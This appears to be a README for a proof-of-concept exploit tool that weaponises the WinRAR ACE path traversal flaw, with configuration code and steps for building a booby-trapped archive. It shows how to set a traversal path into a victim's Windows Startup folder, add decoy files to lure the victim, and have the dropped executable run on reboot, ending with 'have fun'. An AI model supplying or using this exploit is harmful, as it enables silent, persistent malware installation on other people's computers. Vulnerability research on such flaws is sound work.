exp for [Extracting Code Execution From Winrar](https://research.checkpoint.com/extracting-code-execution-from-winrar/)

[poc](https://github.com/Ridter/acefile) by Ridter

how to use ?

you just need to install python 3.7, and prepare a evil file you want to run, set the values you want, **this exp script will generate the evil archive file automatically**!

1. set the values you want

```
... ...

# The archive filename you want
rar_filename = "test.rar"
# The evil file you want to run
evil_filename = "calc.exe"
# The decompression path you want, such shown below
target_filename = r"C:\C:C:../AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hi.exe"
# Other files to be displayed when the victim opens the winrar
# filename_list=[]
filename_list = ["hello.txt", "world.txt"]

... ...

def get_right_hdr_crc(filename):
    # This command may be different, it depends on the your Python3 environment.
    p = os.popen('py -3 acefile.py --headers %s'%(filename))
    res = p.read()
    pattern = re.compile('right_hdr_crc : 0x(.*?) | struct')
    result = pattern.findall(res)
    right_hdr_crc = result[0].upper()
    return hex2raw4(right_hdr_crc)

... ...

```

2. run the exp, exp generated the `test.rar` automatically

![](http://imglf5.nosdn.127.net/img/TnVEN1Q3NkoyR0l5aDVmNFA4MnZMVExtcGVqSGZUdDFBWGgyaGU0NGpHWUlPdmU1bHJTMFJ3PT0.jpg?imageView&thumbnail=500x0)

3. if the victim opens the `test.rar`, he will see the file `hello.txt` and `world.txt`, you can also add more files, more attractive files.

![](http://imglf6.nosdn.127.net/img/TnVEN1Q3NkoyR0l5aDVmNFA4MnZMV0IrVk1NeUxJcWh6aXV3TVFHek8zbXBZaFNhamY4aHBBPT0.jpg?imageView&thumbnail=500x0)

4. when he unpacks the file, the victim's user startup directory will have one more file named `hi.exe`, actually it's a `calc.exe`. when he restart the computer, the `hi.exe` will run.

![](http://imglf3.nosdn.127.net/img/TnVEN1Q3NkoyR0l5aDVmNFA4MnZMV0puYkhZTVkvc1hmK2E3KzBYdmZ0cU5yUzFGVVk0THRnPT0.jpg?imageView&thumbnail=500x0)

have fun! :)
